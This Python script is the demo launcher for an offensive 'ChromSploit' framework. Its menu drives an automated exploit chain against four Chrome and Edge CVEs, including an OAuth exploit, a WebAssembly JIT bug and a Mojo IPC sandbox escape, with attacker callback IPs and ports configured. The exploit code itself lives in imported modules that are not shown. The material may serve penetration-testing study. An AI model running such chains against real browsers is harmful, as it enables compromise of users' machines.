#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ChromSploit Framework - Browser Multi-Exploit Chain Demo
Demonstrates automated exploitation of all 4 browser CVEs
"""

import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modules.browser_exploit_chain import BrowserExploitChain, execute_browser_attack
from core.enhanced_logger import get_logger
from core.color_utils import Colors

logger = get_logger()

def demo_full_browser_compromise():
 """Demonstrate full browser compromise chain"""
 print(f"\n{Colors.CYAN}=== ChromSploit Browser Multi-Exploit Chain Demo ==={Colors.END}")
 print(f"\n{Colors.YELLOW}This demo shows automated exploitation of 4 browser CVEs:{Colors.END}")
 print("1. CVE-2025-4664 - Chrome Link Header (Reconnaissance)")
 print("2. CVE-2025-2857 - Chrome OAuth Exploitation")
 print("3. CVE-2025-30397 - Edge WebAssembly JIT")
 print("4. CVE-2025-2783 - Chrome Mojo IPC Sandbox Escape")
 
 print(f"\n{Colors.RED} This is for educational purposes only!{Colors.END}")
 print(f"{Colors.RED} Only use in authorized testing environments!{Colors.END}")
 
 input(f"\n{Colors.GREEN}Press Enter to start the demo...{Colors.END}")
 
 # Configuration
 config = {
 'target_url': 'http://demo.local:8080',
 'callback_ip': '192.168.1.100',
 'callback_port': 4444,
 'simulation_mode': True # Safe demo mode
 }
 
 # Create browser exploit chain manager
 chain_manager = BrowserExploitChain()
 
 # Option 1: Create and execute chain step by step
 print(f"\n{Colors.CYAN}[1] Creating browser exploitation chain...{Colors.END}")
 chain_id = chain_manager.create_browser_chain('full_browser_compromise', config)
 
 if not chain_id:
 print(f"{Colors.RED}Failed to create chain!{Colors.END}")
 return
 
 print(f"{Colors.GREEN} Chain created: {chain_id[:8]}...{Colors.END}")
 
 # Show chain details
 print(f"\n{Colors.CYAN}[2] Chain Details:{Colors.END}")
 status = chain_manager.get_chain_status(chain_id)
 print(f" Name: {status['name']}")
 print(f" Template: {status['template']}")
 print(f" Browsers: {', '.join(status['browsers_targeted'])}")
 print(f" Steps: {status['progress']}")
 
 # Execute the chain
 print(f"\n{Colors.CYAN}[3] Executing browser exploitation chain...{Colors.END}")
 result = chain_manager.execute_browser_chain(chain_id, async_mode=False)
 
 # Display results
 print(f"\n{Colors.CYAN}[4] Execution Results:{Colors.END}")
 print("=" * 60)
 
 if result.get('success'):
 print(f"{Colors.GREEN} Browser exploitation chain completed successfully!{Colors.END}")
 else:
 print(f"{Colors.RED} Browser exploitation chain failed{Colors.END}")
 
 if 'statistics' in result:
 stats = result['statistics']
 print(f"\n{Colors.YELLOW}Statistics:{Colors.END}")
 print(f" Total Steps: {stats['total_steps']}")
 print(f" Successful: {Colors.GREEN}{stats['successful_steps']}{Colors.END}")
 print(f" Failed: {Colors.RED}{stats['failed_steps']}{Colors.END}")
 
 if 'exploited_browsers' in result:
 print(f"\n{Colors.CYAN}Exploited Browsers:{Colors.END}")
 for browser in result['exploited_browsers']:
 print(f" {browser}")
 
 if 'successful_cves' in result:
 print(f"\n{Colors.GREEN}Successful Exploits:{Colors.END}")
 for cve in result['successful_cves']:
 print(f" {cve}")
 
 if 'recommendations' in result:
 print(f"\n{Colors.YELLOW}Next Steps:{Colors.END}")
 for rec in result['recommendations']:
 print(f" • {rec}")

def demo_quick_attack():
 """Demonstrate quick attack using helper function"""
 print(f"\n{Colors.CYAN}=== Quick Browser Attack Demo ==={Colors.END}")
 print(f"\n{Colors.YELLOW}Using the quick attack helper function...{Colors.END}")
 
 # One-liner browser attack
 result = execute_browser_attack(
 template='chrome_focused_attack',
 config={
 'target_url': 'http://chrome.local',
 'callback_ip': '10.0.0.100',
 'callback_port': 8888,
 'fast_mode': True
 }
 )
 
 print(f"\n{Colors.CYAN}Attack completed!{Colors.END}")
 print(f"Success: {result.get('success')}")
 print(f"Exploited: {result.get('successful_cves', [])}")

def demo_chain_templates():
 """Show available chain templates"""
 print(f"\n{Colors.CYAN}=== Available Browser Chain Templates ==={Colors.END}")
 
 chain_manager = BrowserExploitChain()
 
 for template_name, template in chain_manager.CHAIN_TEMPLATES.items():
 print(f"\n{Colors.YELLOW}Template: {template_name}{Colors.END}")
 print(f" Name: {template['name']}")
 print(f" Description: {template['description']}")
 print(f" Steps: {len(template['steps'])}")
 
 for i, step in enumerate(template['steps'], 1):
 cve_info = chain_manager.BROWSER_CVES.get(step['cve'], {})
 print(f" {i}. {step['cve']} - {cve_info.get('name', 'Unknown')}")

def main():
 """Main demo function"""
 print(f"\n{Colors.BRIGHT_CYAN}ChromSploit Framework - Browser Multi-Exploit Chain{Colors.END}")
 print(f"{Colors.BRIGHT_CYAN}{'='*60}{Colors.END}")
 
 while True:
 print(f"\n{Colors.CYAN}Select Demo:{Colors.END}")
 print("1. Full Browser Compromise (All 4 CVEs)")
 print("2. Quick Chrome Attack")
 print("3. Show Available Templates")
 print("4. Exit")
 
 choice = input(f"\n{Colors.GREEN}Choice: {Colors.END}")
 
 if choice == '1':
 demo_full_browser_compromise()
 elif choice == '2':
 demo_quick_attack()
 elif choice == '3':
 demo_chain_templates()
 elif choice == '4':
 print(f"\n{Colors.YELLOW}Exiting demo...{Colors.END}")
 break
 else:
 print(f"{Colors.RED}Invalid choice!{Colors.END}")
 
 input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.END}")

if __name__ == '__main__':
 main()